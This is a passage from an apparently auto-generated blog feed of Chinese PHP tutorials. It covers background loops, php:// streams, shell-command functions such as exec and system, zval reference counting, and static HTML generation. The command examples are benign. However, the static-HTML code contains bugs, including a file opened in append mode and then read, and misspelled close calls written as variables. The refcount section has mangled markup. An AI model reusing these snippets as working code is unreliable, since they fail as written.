        <content type="html"><![CDATA[<p>PHP在这方面应该说是比较弱，如果只用php去实现可以如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ignore_user_abort();//关闭浏览器后，继续执行php代码</span><br><span class="line">set_time_limit(0);//程序执行时间无限制</span><br><span class="line">$sleep_time = 1;//多长时间执行一次</span><br><span class="line">do&#123;</span><br><span class="line">$fp = fopen(&apos;test.txt&apos;,&apos;a+&apos;);</span><br><span class="line">fwrite($fp,&quot;这是一个php博客：phpddt.com \n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">sleep($sleep_time);</span><br><span class="line">&#125;while(true);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>但是当我执行脚本的时候，即使我关闭了浏览器，我根本就没法去停止这段程序了，所以你需要一个执行脚本的开关，你可以用外部文件引入的方法来实现，在while循环的时候，include开关变量即可。那么就可以这样实现： 建立外部引入变量文件 switch.php 内容如下：<br>​<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">return 1;//1执行脚本 0退出执行脚本</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>改良脚本如下：<br>​<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ignore_user_abort();//关闭浏览器后，继续执行php代码</span><br><span class="line">set_time_limit(0);//程序执行时间无限制</span><br><span class="line">$sleep_time = 5;//多长时间执行一次</span><br><span class="line">$switch = include &apos;switch.php&apos;;</span><br><span class="line">while($switch)&#123;</span><br><span class="line">$switch = include &apos;switch.php&apos;;</span><br><span class="line">$fp = fopen(&apos;test.txt&apos;,&apos;a+&apos;);</span><br><span class="line">fwrite($fp,&quot;这是一个php博客：phpddt.com $switch \n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">sleep($sleep_time);</span><br><span class="line">&#125;</span><br><span class="line">exit();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这个脚本只是测试可行，具体效率应该不高，对于lamp,你完全可以使用crontab 来实现<br>From:<a href="http://www.phpddt.com/php/php-timed-task.html" target="_blank" rel="noopener">http://www.phpddt.com/php/php-timed-task.html</a></p><p>```</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>对PHP输入输出流学习和认识</title>
      <link href="/2013/07/25/php/%E5%AF%B9PHP%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%AE%A4%E8%AF%86/"/>
      <url>/2013/07/25/php/%E5%AF%B9PHP%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%AE%A4%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>PHP输入和输出流是通过php://来访问的，它允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><p>php://stdin, php://stdout 和 php://stderr</p><p>php://stdin，php://stdout 和 php://stderr允许访问 PHP 进程相应的输入或者输出流。</p><p>php://input</p><p>php://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA（原生的post数据），因为它不依赖于特定的 php.ini 指令,内存消耗更少。如下例：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"test"</span> &gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> file_get_contents(<span class="string">"php://input"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>结果：</p><p>php://input接受post数据</p><p>php://output</p><p>php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p><p>php://fd</p><p>php://fd 允许直接访问指定的文件描述符。 例如 php://fd/3 引用了文件描述符 3。</p><p>php://memory 和 php://temp</p><p>php://memory 和 php://temp 是一个类似文件 包装器的数据流，允许读写临时数据。 两者的唯一区别是 php://memory 总是把数据储存在内存中， 而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</p><p>php://filter</p><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。参数如下：</p><p>php:filter//过滤器参数</p><p>如下例：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">/* 这会以大写字母输出 www.phpddt.com 的全部内容 */</span></span></span><br><span class="line"><span class="php">readfile(<span class="string">"php://filter/read=string.toupper/resource=http://www.phpddt.com"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>以上摘自：<a href="http://www.phpddt.com/php/php-input-output.html" target="_blank" rel="noopener">http://www.phpddt.com/php/php-input-output.html</a><br>以下出自php手册</p><p>Example #1 php://temp/maxmemory</p><p> This optional parameter allows setting the memory limit before php://temp starts using a temporary file. </p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// Set the limit to 5 MB.</span></span></span><br><span class="line"><span class="php">$fiveMBs = <span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span></span><br><span class="line"><span class="php">$fp = fopen(<span class="string">"php://temp/maxmemory:$fiveMBs"</span>, <span class="string">'r+'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">fputs($fp, <span class="string">"hello\n"</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// Read what we have written.</span></span></span><br><span class="line"><span class="php">rewind($fp);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> stream_get_contents($fp);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>Example #2 php://filter/resource=<stream to be filtered></stream></p><p> This parameter must be located at the end of your php://filter specification and should point to the stream which you want filtered. </p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line">/* This is equivalent to simply:</span><br><span class="line">  readfile("http://www.example.com");</span><br><span class="line"><span class="php">  since no filters are actually specified */</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">readfile(<span class="string">"php://filter/resource=http://www.example.com"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>Example #3 php://filter/read=<filter list to apply read chain></filter></p><p> This parameter takes one or more filternames separated by the pipe character |.</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line">/* This will output the contents of</span><br><span class="line"><span class="php">  www.example.com entirely in uppercase */</span></span><br><span class="line"><span class="php">readfile(<span class="string">"php://filter/read=string.toupper/resource=http://www.example.com"</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line">/* This will do the same as above</span><br><span class="line"><span class="php">  but will also ROT13 encode it */</span></span><br><span class="line"><span class="php">readfile(<span class="string">"php://filter/read=string.toupper|string.rot13/resource=http://www.example.com"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>Example #4 php://filter/write=<filter list to apply write chain></filter></p><p> This parameter takes one or more filternames separated by the pipe character |.</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/* This will filter <span class="keyword">the</span> <span class="built_in">string</span> <span class="string">"Hello World"</span></span><br><span class="line">  <span class="keyword">through</span> <span class="keyword">the</span> rot13 filter, <span class="keyword">then</span> <span class="built_in">write</span> <span class="keyword">to</span></span><br><span class="line">  example.txt <span class="keyword">in</span> <span class="keyword">the</span> current directory */</span><br><span class="line">file_put_contents(<span class="string">"php://filter/write=string.rot13/resource=example.txt"</span>,<span class="string">"Hello World"</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP执行外部命令</title>
      <link href="/2013/07/25/php/PHP%E6%89%A7%E8%A1%8C%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2013/07/25/php/PHP%E6%89%A7%E8%A1%8C%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>PHP是完全支持外部命令的，但是出于安全考虑，一般很少使用。</p><p>PHP提供共了3种方法调用外部命令：</p><p>（1）调用执行外部命令函数（system()，exec()，passthru()，shell_exec()）</p><p>（2）使用反撇号`执行命令</p><p>（3）popen()函数打开进程</p><p>下面来一一说明：</p><p>一、调用执行外部命令函数</p><p>1.exec()函数  <figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">string exec ( string $command [,<span class="built_in"> array </span>&amp;$output [,<span class="built_in"> int </span>&amp;$return_var ］ )</span><br></pre></td></tr></table></figure></p><p>说明：这个函数不会直接输出结果，而是把结果输出到第二个参数（数组）中，第三个参数用来取得命令执行的状态码，通常执行成功都是返回0。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//打印出当前文件目录及其文件信息</span></span></span><br><span class="line"><span class="php">exec(<span class="string">"dir"</span>,$out);</span></span><br><span class="line"><span class="php">print_r($out);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.system()函数  string system ( string $command [, int &amp;$return_var ] )</p><p> 说明：</p><p>system在执行系统外部命令时，它执行给定的命令，输出和返回结果。第二个参数是可选的，用来得到命令执行后的状态码。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    system(<span class="string">"dir"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>3.passthru()函数 void passthru ( string $command [, int &amp;$return_var ] )</p><p>说明：passthru直接将结果输出到游览器，不返回任何值，且其可以输出二进制，比如图像数据。第二个参数可选，是状态码。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"> passthru (<span class="string">'echo $PATH'</span>);</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>4.shell_exec()函数 string shell_exec ( string $cmd )</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">/** by www.phpddt.com */</span></span></span><br><span class="line"><span class="php">$output = shell_exec(<span class="string">'ls -l'</span>);</span></span><br><span class="line"><span class="php">var_dump($output);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>二、使用反撇号`执行命令</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> `dir`;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>说明: 在使用这种方法执行系统外部命令时，要确保shell_exec函数可用，否则是无法使用这种反撇号执行系统外部命令的。</p><p>三、使用popen()打开进程，执行命令</p><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">resource <span class="keyword">popen</span> ( <span class="keyword">string</span> $command , <span class="keyword">string</span> $mode )</span><br></pre></td></tr></table></figure><p>说明：可以进行命令交互，popen( )函数打开一个进程管道来执行给定的命令，返回一个文件句柄，可以对它读和写。返回值和fopen()函数一样，返回一个文件指针。除非使用的是单一的模式打开(读or写)，否则必须使用pclose()函数关闭。该指针可以被fgets(),fgetss(),fwrite()调用。出错时，返回FALSE。</p><p> 可以借鉴手册上这个例子：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(E_ALL);</span></span><br><span class="line"><span class="php">$handle = popen(<span class="string">'/path/to/executable 2&gt;&amp;1'</span>, <span class="string">'r'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"'$handle'; "</span> . gettype($handle) . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">$read = fread($handle, <span class="number">2096</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $read;</span></span><br><span class="line"><span class="php">pclose($handle);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>在PHP中你这样做，可能会带来安全隐患的（详解PHP漏洞），当你使用这些函数来执行系统命令时，可以使用escapeshellcmd()和escapeshellarg()函数阻止用户恶意在系统上执行命令，escapeshellcmd()针对的是执行的系统命令，而escapeshellarg()针对的是执行系统命令的参数。这两个参数有点类似addslashes()的功能。</p><p>From:<a href="http://www.phpddt.com/php/php-execute-an-external-program.html" target="_blank" rel="noopener">http://www.phpddt.com/php/php-execute-an-external-program.html</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>引用计数基本知识</title>
      <link href="/2013/07/24/php/%E5%BC%95%E7%94%A8%E8%AE%A1%E6%95%B0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
      <url>/2013/07/24/php/%E5%BC%95%E7%94%A8%E8%AE%A1%E6%95%B0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2>引用计数基本知识</h2>每个php变量存在一个叫"zval"的变量容器中。一个zval变量容器，除了包含变量的类型和值，还包括两个字节的额外信息。第一个是"is_ref"，是个bool值，用来标识这个变量是否是属于引用集合(reference set)。通过这个字节，php引擎才能把普通变量和引用变量区分开来，由于php允许用户通过使用&amp;来使用自定义引用，zval变量容器中还有一个内部引用计数机制，来优化内存使用。第二个额外字节是"refcount"，用以表示指向这个zval变量容器的变量(也称符号即symbol)个数。所有的符号存在一个符号表中，其中每个符号都有作用域(scope)，那些主脚本(比如：通过浏览器请求的的脚本)和每个函数或者方法也都有作用域。<p>当一个变量被赋常量值时，就会生成一个zval变量容器，如下例这样：</p><p><strong>Example #1 Creating a new zval container</strong></p><div><code>&lt;?php$a = "new string";?&gt;</code></div>&nbsp;<p>在上例中，新的变量<em>a</em>，是在当前作用域中生成的。并且生成了类型为 <a href="http://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a> 和值为<em>new string</em>的变量容器。在额外的两个字节信息中，”is_ref”被默认设置为 <strong><code>FALSE</code></strong>，因为没有任何自定义的引用生成。”refcount” 被设定为 <em>1</em>，因为这里只有一个变量使用这个变量容器. 注意到当”refcount”的值是<em>1</em>时，”is_ref”的值总是<strong><code>FALSE</code></strong>. 如果你已经安装了<a href="http://xdebug.org/" target="_blank" rel="noopener">» Xdebug</a>，你能通过调用函数 <strong>xdebug_debug_zval()</strong>显示”refcount”和”is_ref”的值。</p><p>&nbsp;</p><div id="example-363"><p><strong>Example #2 Displaying zval information</strong></p><div><div><code>&lt;?phpxdebug_debug_zval('a');?&gt;</code></div></div><div><p>以上例程会输出：</p></div><div><div><figure class="highlight plain"><figcaption><span>(refcount</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&amp;nbsp;</span><br><span class="line"></span><br><span class="line">把一个变量赋值给另一变量将增加引用次数(refcount).</span><br><span class="line"></span><br><span class="line">&amp;nbsp;</span><br><span class="line">&lt;div id=&quot;example-364&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;strong&gt;Example #3 Increasing refcount of a zval&lt;/strong&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;div&gt;&lt;code&gt;&amp;lt;?php</span><br><span class="line">$a = &quot;new string&quot;;</span><br><span class="line">$b = $a;</span><br><span class="line">xdebug_debug_zval( &apos;a&apos; );</span><br><span class="line">?&amp;gt;&lt;/code&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line"></span><br><span class="line">以上例程会输出：</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">```a: (refcount=2, is_ref=0)=&apos;new string&apos;</span><br></pre></td></tr></table></figure></div></div></div>&nbsp;<p>这时，引用次数是<em>2</em>，因为同一个变量容器被变量 <var>a</var> 和变量 <var>b</var>关联.当没必要时，php不会去复制已生成的变量容器。变量容器在”refcount“变成0时就被销毁. 当任何关联到某个变量容器的变量离开它的作用域(比如：函数执行结束)，或者对变量调用了函数 <a href="http://www.php.net/manual/zh/function.unset.php" target="_blank" rel="noopener">unset()</a>时，”refcount“就会减1，下面的例子就能说明:</p><p>&nbsp;</p><div id="example-365"><p><strong>Example #4 Decreasing zval refcount</strong></p><div><div><code>&lt;?php$a = "new string";$c = $b = $a;xdebug_debug_zval( 'a' );unset( $b, $c );xdebug_debug_zval( 'a' );?&gt;</code></div></div><div><p>以上例程会输出：</p></div><div><div><figure class="highlight plain"><figcaption><span>(refcount</span></figcaption><table><tr><td class="code"><pre><span class="line">a: (refcount=1, is_ref=0)=&apos;new string&apos;</span><br></pre></td></tr></table></figure></div></div></div>&nbsp;<p>如果我们现在执行 <em>unset($a);</em>，包含类型和值的这个变量容器就会从内存中删除。</p><div id="features.gc.compound-types"><h3>复合类型(Compound Types)</h3>当考虑像 <a href="http://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a>和<a href="http://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a>这样的复合类型时，事情就稍微有点复杂. 与 标量(scalar)类型的值不同，<a href="http://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a>和 <a href="http://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a>类型的变量把它们的成员或属性存在自己的符号表中。这意味着下面的例子将生成三个zval变量容器。<p>&nbsp;</p><div id="example-366"><p><strong>Example #5 Creating a <a href="http://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a> zval</strong></p><div><div><code>&lt;?php$a = array( 'meaning' =&gt; 'life', 'number' =&gt; 42 );xdebug_debug_zval( 'a' );?&gt;</code></div></div><div><p>以上例程的输出类似于：</p></div><div><div><figure class="highlight plain"><figcaption><span>(refcount</span></figcaption><table><tr><td class="code"><pre><span class="line">   &apos;meaning&apos; =&amp;gt; (refcount=1, is_ref=0)=&apos;life&apos;,</span><br><span class="line">   &apos;number&apos; =&amp;gt; (refcount=1, is_ref=0)=42</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div></div><div><p>Or graphically</p></div><div><div><img alt="Zvals for a simple array" src="http://www.php.net/manual/zh/images/12f37b1c6963c1c5c18f30495416a197-simple-array.png" width="593" height="143"></div></div></div>&nbsp;<p>这三个zval变量容器是: <var>a</var>，<var>meaning</var>和 <var>number</var>。增加和减少”refcount”的规则和上面提到的一样. 下面, 我们在数组中再添加一个元素,并且把它的值设为数组中已存在元素的值:</p><p>&nbsp;</p><div id="example-367"><p><strong>Example #6 Adding already existing element to an array</strong></p><div><div><code>&lt;?php$a = array( 'meaning' =&gt; 'life', 'number' =&gt; 42 );$a['life'] = $a['meaning'];xdebug_debug_zval( 'a' );?&gt;</code></div></div><div><p>以上例程的输出类似于：</p></div><div><div><figure class="highlight plain"><figcaption><span>(refcount</span></figcaption><table><tr><td class="code"><pre><span class="line">   &apos;meaning&apos; =&amp;gt; (refcount=2, is_ref=0)=&apos;life&apos;,</span><br><span class="line">   &apos;number&apos; =&amp;gt; (refcount=1, is_ref=0)=42,</span><br><span class="line">   &apos;life&apos; =&amp;gt; (refcount=2, is_ref=0)=&apos;life&apos;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div></div><div><p>Or graphically</p></div><div><div><img alt="Zvals for a simple array with a reference" src="http://www.php.net/manual/zh/images/12f37b1c6963c1c5c18f30495416a197-simple-array2.png" width="593" height="143"></div></div></div>&nbsp;<p>从以上的xdebug输出信息，我们看到原有的数组元素和新添加的数组元素关联到同一个”refcount”<em>2</em>的zval变量容器. 尽管 Xdebug的输出显示两个值为<em>‘life’</em>的 zval 变量容器，其实是同一个。 函数<strong>xdebug_debug_zval()</strong>不显示这个信息，但是你能通过显示内存指针信息来看到。</p><p>删除数组中的一个元素，就是类似于从作用域中删除一个变量. 删除后,数组中的这个元素所在的容器的“refcount”值减少，同样，当“refcount”为0时，这个变量容器就从内存中被删除，下面又一个例子可以说明：</p><p>&nbsp;</p><div id="example-368"><p><strong>Example #7 Removing an element from an array</strong></p><div><div><code>&lt;?php$a = array( 'meaning' =&gt; 'life', 'number' =&gt; 42 );$a['life'] = $a['meaning'];unset( $a['meaning'], $a['number'] );xdebug_debug_zval( 'a' );?&gt;</code></div></div><div><p>以上例程的输出类似于：</p></div><div><div><figure class="highlight plain"><figcaption><span>(refcount</span></figcaption><table><tr><td class="code"><pre><span class="line">   &apos;life&apos; =&amp;gt; (refcount=1, is_ref=0)=&apos;life&apos;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div></div></div>&nbsp;<p>现在，当我们添加一个数组本身作为这个数组的元素时，事情就变得有趣，下个例子将说明这个。例中我们加入了引用操作符，否则php将生成一个复制。</p><p>&nbsp;</p><div id="example-369"><p><strong>Example #8 Adding the array itself as an element of it self</strong></p><div><div><code>&lt;?php$a = array( 'one' );$a[] =&amp; $a;xdebug_debug_zval( 'a' );?&gt;</code></div></div><div><p>以上例程的输出类似于：</p></div><div><div><figure class="highlight plain"><figcaption><span>(refcount</span></figcaption><table><tr><td class="code"><pre><span class="line">   0 =&amp;gt; (refcount=1, is_ref=0)=&apos;one&apos;,</span><br><span class="line">   1 =&amp;gt; (refcount=2, is_ref=1)=...</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div></div><div><p>Or graphically</p></div><div><div><img alt="Zvals for an array with a circular reference" src="http://www.php.net/manual/zh/images/12f37b1c6963c1c5c18f30495416a197-loop-array.png" width="533" height="144"></div></div></div>&nbsp;<p>能看到数组变量 (<var>a</var>) 同时也是这个数组的第二个元素(<var>1</var>) 指向的变量容器中“refcount”为 <em>2</em>。上面的输出结果中的”…”说明发生了递归操作, 显然在这种情况下意味着”…”指向原始数组。</p><p>跟刚刚一样，对一个变量调用unset，将删除这个符号，且它指向的变量容器中的引用次数也减1。所以，如果我们在执行完上面的代码后，对变量<var>$a</var>调用unset, 那么变量 <var>$a</var> 和数组元素 “1” 所指向的变量容器的引用次数减1, 从”2”变成”1”. 下例可以说明:</p><p>&nbsp;</p><div id="example-370"><p><strong>Example #9 Unsetting <var><var>$a</var></var></strong></p><div><div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   0 =&amp;gt; (refcount=1, is_ref=0)=&apos;one&apos;,</span><br><span class="line">   1 =&amp;gt; (refcount=1, is_ref=1)=...</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div></div><div><p>Or graphically</p></div><div><div><img alt="Zvals after removal of array with a circular reference demonstrating the memory leak" src="http://www.php.net/manual/zh/images/12f37b1c6963c1c5c18f30495416a197-leak-array.png" width="463" height="144"></div></div></div>&nbsp;</div><div id="features.gc.cleanup-problems"><h3>清理变量容器的问题(Cleanup Problems)</h3>尽管不再有某个作用域中的任何符号指向这个结构(就是变量容器)，由于数组元素“1”仍然指向数组本身，所以这个容器不能被清除 。因为没有另外的符号指向它，用户没有办法清除这个结构，结果就会导致内存泄漏。庆幸的是，php将在请求结束时清除这个数据结构，但是在php清除之前，将耗费不少空间的内存。如果你要实现分析算法，或者要做其他像一个子元素指向它的父元素这样的事情，这种情况就会经常发生。当然，同样的情况也会发生在对象上，实际上对象更有可能出现这种情况，因为对象总是隐式的被引用。<p>如果上面的情况发生仅仅一两次倒没什么，但是如果出现几千次，甚至几十万次的内存泄漏，这显然是个大问题。在长时间运行的脚本，比如请求基本上不会结束的守护进程(deamons)或者单元测试中的大的套件(sets)中，在给 eZ 组件库的模板组件做单元测试时，后者(指单元测试中的大的套件)就会出现问题.它将需要耗用2GB的内存，而一般的测试服务器没有这么大的内存空间。</p><p>From:<a href="http://php.net/manual/zh/features.gc.refcounting-basics.php" target="_blank" rel="noopener">http://php.net/manual/zh/features.gc.refcounting-basics.php</a></p></div>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP生成静态html文件 的三种方法</title>
      <link href="/2013/07/18/php/PHP%E7%94%9F%E6%88%90%E9%9D%99%E6%80%81html%E6%96%87%E4%BB%B6%20%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
      <url>/2013/07/18/php/PHP%E7%94%9F%E6%88%90%E9%9D%99%E6%80%81html%E6%96%87%E4%BB%B6%20%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>1,下面使用模版的一个方法!</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$fp = fopen (<span class="string">"templets.html"</span>,<span class="string">"a"</span>); </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($fp)&#123; </span></span><br><span class="line"><span class="php">$fup = fread ($fp,filesize(<span class="string">"templets.html"</span>)); </span></span><br><span class="line"><span class="php">$fp2 = fopen (<span class="string">"html.shtml"</span>,<span class="string">"w"</span>); </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($fwrite ($fp2,$fup))&#123; </span></span><br><span class="line"><span class="php">$fclose ($fp); </span></span><br><span class="line"><span class="php">$fcolse ($fp2); </span></span><br><span class="line"><span class="php"><span class="keyword">die</span> (<span class="string">"写入模板成功"</span>); </span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123; </span></span><br><span class="line"><span class="php">fclose ($fp); </span></span><br><span class="line"><span class="php"><span class="keyword">die</span> (<span class="string">"写入模板失败!"</span>); </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>简单的将模板写进一个文件中存为html.html<br>2,按时间生成html文件名<br> &lt;?<br>$content = “这是一个以日期时间为文件名的静态生成网页的测试文件，<br>文件名格式一般为<font color="#ff0000">年月日时分秒.html</font>“; </p><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$date = <span class="keyword">date</span>(<span class="string">'YmdHis'</span>); </span><br><span class="line">$fp = <span class="keyword">fopen</span> (<span class="keyword">date</span>(<span class="string">'YmdHis'</span>) . <span class="string">'.html'</span>,<span class="string">"w"</span>);</span><br></pre></td></tr></table></figure><p>//本函数可用来打开本地或者远端的文件 ‘w’ 开文件方式为写入，<br>文件指针指到开始处，并将原文件的长度设为 0。若文件不存在，<br>则建立新文件。 </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fwrite ($fp,$content))&#123;</span><br><span class="line"><span class="comment">//格式是.int fwrite(int fp(文件名), string string(内容),</span></span><br><span class="line"> int [length](长度));本函数将字符串 string 写入文件资料流的指针 fp 上。</span><br><span class="line">若有指定长度 length，则会写入指定长度字符串，或是写到字符串结束。 </span><br><span class="line">fclose ($fp);<span class="comment">//函数用来关闭已经打开的文件的指针 fp。</span></span><br><span class="line">成功返回 <span class="keyword">true</span>，失败则返回 <span class="keyword">false</span>。 </span><br><span class="line"><span class="keyword">die</span> (<span class="string">"写入模板成功"</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">fclose ($fp); </span><br><span class="line"><span class="keyword">die</span> (<span class="string">"写入模板失败!"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> ($content); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>3,下面为转换文件名的一个方法<br> <figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$s_fname = <span class="string">"93e.php"</span><span class="comment">; </span></span><br><span class="line">$o_fname = <span class="string">"93e.htm"</span><span class="comment">; </span></span><br><span class="line">ob_end_clean()<span class="comment">; </span></span><br><span class="line">ob_start()<span class="comment">; </span></span><br><span class="line">include($s_fname)<span class="comment">; </span></span><br><span class="line">$length = ob_get_length()<span class="comment">; </span></span><br><span class="line">$<span class="keyword">buffer </span>= ob_get_contents()<span class="comment">; </span></span><br><span class="line">$<span 